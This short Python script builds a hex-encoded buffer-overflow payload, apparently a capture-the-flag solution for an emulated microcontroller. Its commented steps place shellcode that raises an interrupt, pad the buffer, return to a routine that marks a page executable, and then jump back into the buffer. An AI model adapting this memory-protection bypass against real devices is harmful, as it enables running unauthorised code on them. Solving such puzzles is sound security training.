# mov 0xff00,sr
payload = '324000ff'
# call INT
payload += 'b0121000'

# Padding
payload += '4141414141414141'

# Ret to `mark_page_executable internal`
payload += 'be44'
# Padding that is expected
payload += '000000000000'
# Page to mark
payload += '3f00'
# Executable, not writable
payload += '0000'

# Return to the beginning of the buffer
payload += 'ee3f'

print(payload)